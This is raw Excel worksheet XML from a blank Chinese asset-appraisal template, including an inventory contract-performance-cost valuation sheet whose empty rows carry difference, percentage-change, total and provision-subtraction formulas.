      <c r="L7" s="555" t="n"/>
      <c r="M7" s="555">
        <f>L7-H7</f>
        <v/>
      </c>
      <c r="N7" s="555">
        <f>IF(H7=0,"",M7/H7*100)</f>
        <v/>
      </c>
      <c r="O7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="381" t="n"/>
      <c r="E8" s="381" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555" t="n"/>
      <c r="M8" s="555">
        <f>L8-H8</f>
        <v/>
      </c>
      <c r="N8" s="555">
        <f>IF(H8=0,"",M8/H8*100)</f>
        <v/>
      </c>
      <c r="O8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="381" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555" t="n"/>
      <c r="M9" s="555">
        <f>L9-H9</f>
        <v/>
      </c>
      <c r="N9" s="555">
        <f>IF(H9=0,"",M9/H9*100)</f>
        <v/>
      </c>
      <c r="O9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="381" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555" t="n"/>
      <c r="M10" s="555">
        <f>L10-H10</f>
        <v/>
      </c>
      <c r="N10" s="555">
        <f>IF(H10=0,"",M10/H10*100)</f>
        <v/>
      </c>
      <c r="O10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="381" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555" t="n"/>
      <c r="M11" s="555">
        <f>L11-H11</f>
        <v/>
      </c>
      <c r="N11" s="555">
        <f>IF(H11=0,"",M11/H11*100)</f>
        <v/>
      </c>
      <c r="O11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="381" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555" t="n"/>
      <c r="M12" s="555">
        <f>L12-H12</f>
        <v/>
      </c>
      <c r="N12" s="555">
        <f>IF(H12=0,"",M12/H12*100)</f>
        <v/>
      </c>
      <c r="O12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="381" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555" t="n"/>
      <c r="M13" s="555">
        <f>L13-H13</f>
        <v/>
      </c>
      <c r="N13" s="555">
        <f>IF(H13=0,"",M13/H13*100)</f>
        <v/>
      </c>
      <c r="O13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="381" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555" t="n"/>
      <c r="M14" s="555">
        <f>L14-H14</f>
        <v/>
      </c>
      <c r="N14" s="555">
        <f>IF(H14=0,"",M14/H14*100)</f>
        <v/>
      </c>
      <c r="O14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="381" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555" t="n"/>
      <c r="M15" s="555">
        <f>L15-H15</f>
        <v/>
      </c>
      <c r="N15" s="555">
        <f>IF(H15=0,"",M15/H15*100)</f>
        <v/>
      </c>
      <c r="O15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="381" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555" t="n"/>
      <c r="M16" s="555">
        <f>L16-H16</f>
        <v/>
      </c>
      <c r="N16" s="555">
        <f>IF(H16=0,"",M16/H16*100)</f>
        <v/>
      </c>
      <c r="O16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="381" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555" t="n"/>
      <c r="M17" s="555">
        <f>L17-H17</f>
        <v/>
      </c>
      <c r="N17" s="555">
        <f>IF(H17=0,"",M17/H17*100)</f>
        <v/>
      </c>
      <c r="O17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="381" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555" t="n"/>
      <c r="M18" s="555">
        <f>L18-H18</f>
        <v/>
      </c>
      <c r="N18" s="555">
        <f>IF(H18=0,"",M18/H18*100)</f>
        <v/>
      </c>
      <c r="O18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="381" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555" t="n"/>
      <c r="M19" s="555">
        <f>L19-H19</f>
        <v/>
      </c>
      <c r="N19" s="555">
        <f>IF(H19=0,"",M19/H19*100)</f>
        <v/>
      </c>
      <c r="O19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="381" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555" t="n"/>
      <c r="M20" s="555">
        <f>L20-H20</f>
        <v/>
      </c>
      <c r="N20" s="555">
        <f>IF(H20=0,"",M20/H20*100)</f>
        <v/>
      </c>
      <c r="O20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="381" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555" t="n"/>
      <c r="M21" s="555">
        <f>L21-H21</f>
        <v/>
      </c>
      <c r="N21" s="555">
        <f>IF(H21=0,"",M21/H21*100)</f>
        <v/>
      </c>
      <c r="O21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="381" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555" t="n"/>
      <c r="M22" s="555">
        <f>L22-H22</f>
        <v/>
      </c>
      <c r="N22" s="555">
        <f>IF(H22=0,"",M22/H22*100)</f>
        <v/>
      </c>
      <c r="O22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="381" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555" t="n"/>
      <c r="M23" s="555">
        <f>L23-H23</f>
        <v/>
      </c>
      <c r="N23" s="555">
        <f>IF(H23=0,"",M23/H23*100)</f>
        <v/>
      </c>
      <c r="O23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="381" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555" t="n"/>
      <c r="M24" s="555">
        <f>L24-H24</f>
        <v/>
      </c>
      <c r="N24" s="555">
        <f>IF(H24=0,"",M24/H24*100)</f>
        <v/>
      </c>
      <c r="O24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="381" t="n"/>
      <c r="E25" s="381" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555" t="n"/>
      <c r="M25" s="555">
        <f>L25-H25</f>
        <v/>
      </c>
      <c r="N25" s="555">
        <f>IF(H25=0,"",M25/H25*100)</f>
        <v/>
      </c>
      <c r="O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07" t="n"/>
      <c r="E26" s="307" t="n"/>
      <c r="F26" s="555">
        <f>ROUND(SUM(F7:F25),2)</f>
        <v/>
      </c>
      <c r="G26" s="555">
        <f>ROUND(SUM(G7:G25),2)</f>
        <v/>
      </c>
      <c r="H26" s="555">
        <f>ROUND(SUM(H7:H25),2)</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>ROUND(SUM(I7:I25),2)</f>
        <v/>
      </c>
      <c r="J26" s="555">
        <f>ROUND(SUM(J7:J25),2)</f>
        <v/>
      </c>
      <c r="K26" s="555" t="n"/>
      <c r="L26" s="555">
        <f>ROUND(SUM(L7:L25),2)</f>
        <v/>
      </c>
      <c r="M26" s="555">
        <f>L26-H26</f>
        <v/>
      </c>
      <c r="N26" s="555">
        <f>IF(H26=0,"",M26/H26*100)</f>
        <v/>
      </c>
      <c r="O26" s="383" t="n"/>
    </row>
    <row r="27" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B27" s="185" t="inlineStr">
        <is>
          <t>减：存货跌价准备</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="307" t="n"/>
      <c r="E27" s="307" t="n"/>
      <c r="F27" s="555" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555" t="n"/>
      <c r="L27" s="555" t="n"/>
      <c r="M27" s="555">
        <f>L27-H27</f>
        <v/>
      </c>
      <c r="N27" s="555">
        <f>IF(H27=0,"",M27/H27*100)</f>
        <v/>
      </c>
      <c r="O27" s="383" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="307" t="n"/>
      <c r="E28" s="307" t="n"/>
      <c r="F28" s="555">
        <f>ROUND(F26-F27,2)</f>
        <v/>
      </c>
      <c r="G28" s="555">
        <f>ROUND(G26-G27,2)</f>
        <v/>
      </c>
      <c r="H28" s="555">
        <f>ROUND(H26-H27,2)</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>ROUND(I26-I27,2)</f>
        <v/>
      </c>
      <c r="J28" s="555">
        <f>ROUND(J26-J27,2)</f>
        <v/>
      </c>
      <c r="K28" s="555" t="n"/>
      <c r="L28" s="555">
        <f>ROUND(L26-L27,2)</f>
        <v/>
      </c>
      <c r="M28" s="555">
        <f>L28-H28</f>
        <v/>
      </c>
      <c r="N28" s="555">
        <f>IF(H28=0,"",M28/H28*100)</f>
        <v/>
      </c>
      <c r="O28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="16">
    <mergeCell ref="J5:L5"/>
    <mergeCell ref="B1:O1"/>
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="N5:N6"/>
    <mergeCell ref="O5:O6"/>
    <mergeCell ref="B26:C26"/>
    <mergeCell ref="B2:O2"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="G5:H5"/>
    <mergeCell ref="C5:C6"/>
    <mergeCell ref="F5:F6"/>
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="D5:D6"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="I5:I6"/>
    <mergeCell ref="M5:M6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:O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6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 codeName="Sheet36">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:I28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12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="13" customWidth="1" style="410" min="2" max="2"/>
    <col width="30.8333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="25.8333333333333" customWidth="1" style="410" min="4" max="4"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="15.1666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col width="13.5" customWidth="1" style="410" min="9" max="9"/>
    <col width="9" customWidth="1" style="410" min="10" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="26" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>存货—合同履约成本评估明细表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373" t="n"/>
      <c r="G3" s="373" t="n"/>
      <c r="H3" s="373" t="n"/>
      <c r="I3" s="291" t="inlineStr">
        <is>
          <t>表3-9-9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185" t="inlineStr">
        <is>
          <t>项目名称</t>
        </is>
      </c>
      <c r="D5" s="185" t="inlineStr">
        <is>
          <t>结算对象</t>
        </is>
      </c>
      <c r="E5" s="185" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="F5" s="185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</row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="381" t="n"/>
      <c r="E7" s="555" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="555">
        <f>IF(E7=0,"",G7/E7*100)</f>
        <v/>
      </c>
      <c r="I7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="381" t="n"/>
      <c r="E8" s="555" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="555">
        <f>IF(E8=0,"",G8/E8*100)</f>
        <v/>
      </c>
      <c r="I8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="555" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555">
        <f>F9-E9</f>
        <v/>
      </c>
      <c r="H9" s="555">
        <f>IF(E9=0,"",G9/E9*100)</f>
        <v/>
      </c>
      <c r="I9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="555" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555">
        <f>F10-E10</f>
        <v/>
      </c>
      <c r="H10" s="555">
        <f>IF(E10=0,"",G10/E10*100)</f>
        <v/>
      </c>
      <c r="I10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="555" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555">
        <f>F11-E11</f>
        <v/>
      </c>
      <c r="H11" s="555">
        <f>IF(E11=0,"",G11/E11*100)</f>
        <v/>
      </c>
      <c r="I11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="555" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555">
        <f>F12-E12</f>
        <v/>
      </c>
      <c r="H12" s="555">
        <f>IF(E12=0,"",G12/E12*100)</f>
        <v/>
      </c>
      <c r="I12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="555" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555">
        <f>F13-E13</f>
        <v/>
      </c>
      <c r="H13" s="555">
        <f>IF(E13=0,"",G13/E13*100)</f>
        <v/>
      </c>
      <c r="I13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="555" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555">
        <f>F14-E14</f>
        <v/>
      </c>
      <c r="H14" s="555">
        <f>IF(E14=0,"",G14/E14*100)</f>
        <v/>
      </c>
      <c r="I14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="555" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555">
        <f>F15-E15</f>
        <v/>
      </c>
      <c r="H15" s="555">
        <f>IF(E15=0,"",G15/E15*100)</f>
        <v/>
      </c>
      <c r="I15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="555" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555">
        <f>F16-E16</f>
        <v/>
      </c>
      <c r="H16" s="555">
        <f>IF(E16=0,"",G16/E16*100)</f>
        <v/>
      </c>
      <c r="I16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="555" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555">
        <f>F17-E17</f>
        <v/>
      </c>
      <c r="H17" s="555">
        <f>IF(E17=0,"",G17/E17*100)</f>
        <v/>
      </c>
      <c r="I17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="555" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555">
        <f>F18-E18</f>
        <v/>
      </c>
      <c r="H18" s="555">
        <f>IF(E18=0,"",G18/E18*100)</f>
        <v/>
      </c>
      <c r="I18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555">
        <f>F19-E19</f>
        <v/>
      </c>
      <c r="H19" s="555">
        <f>IF(E19=0,"",G19/E19*100)</f>
        <v/>
      </c>
      <c r="I19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="555" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555">
        <f>F20-E20</f>
        <v/>
      </c>
      <c r="H20" s="555">
        <f>IF(E20=0,"",G20/E20*100)</f>
        <v/>
      </c>
      <c r="I20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="555" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555">
        <f>F21-E21</f>
        <v/>
      </c>
      <c r="H21" s="555">
        <f>IF(E21=0,"",G21/E21*100)</f>
        <v/>
      </c>
      <c r="I21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="555" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555">
        <f>F22-E22</f>
        <v/>
      </c>
      <c r="H22" s="555">
        <f>IF(E22=0,"",G22/E22*100)</f>
        <v/>
      </c>
      <c r="I22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="555" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555">
        <f>F23-E23</f>
        <v/>
      </c>
      <c r="H23" s="555">
        <f>IF(E23=0,"",G23/E23*100)</f>
        <v/>
      </c>
      <c r="I23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="555" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555">
        <f>F24-E24</f>
        <v/>
      </c>
      <c r="H24" s="555">
        <f>IF(E24=0,"",G24/E24*100)</f>
        <v/>
      </c>
      <c r="I24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="381" t="n"/>
      <c r="E25" s="555" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555">
        <f>F25-E25</f>
        <v/>
      </c>
      <c r="H25" s="555">
        <f>IF(E25=0,"",G25/E25*100)</f>
        <v/>
      </c>
      <c r="I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07" t="n"/>
      <c r="E26" s="555">
        <f>ROUND(SUM(E7:E25),2)</f>
        <v/>
      </c>
      <c r="F26" s="555">
        <f>ROUND(SUM(F7:F25),2)</f>
        <v/>
      </c>
      <c r="G26" s="555">
        <f>F26-E26</f>
        <v/>
      </c>
      <c r="H26" s="555">
        <f>IF(E26=0,"",G26/E26*100)</f>
        <v/>
      </c>
      <c r="I26" s="383" t="n"/>
    </row>
    <row r="27" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B27" s="185" t="inlineStr">
        <is>
          <t>减：减值准备</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="307" t="n"/>
      <c r="E27" s="555" t="n"/>
      <c r="F27" s="555" t="n"/>
      <c r="G27" s="555">
        <f>F27-E27</f>
        <v/>
      </c>
      <c r="H27" s="555">
        <f>IF(E27=0,"",G27/E27*100)</f>
        <v/>
      </c>
      <c r="I27" s="383" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="307" t="n"/>
      <c r="E28" s="555">
        <f>ROUND(E26-E27,2)</f>
        <v/>
      </c>
      <c r="F28" s="555">
        <f>ROUND(F26-F27,2)</f>
        <v/>
      </c>
      <c r="G28" s="555">
        <f>F28-E28</f>
        <v/>
      </c>
      <c r="H28" s="555">
        <f>IF(E28=0,"",G28/E28*100)</f>
        <v/>
      </c>
      <c r="I28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="13">
    <mergeCell ref="G5:G6"/>
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="H5:H6"/>
    <mergeCell ref="B26:C26"/>
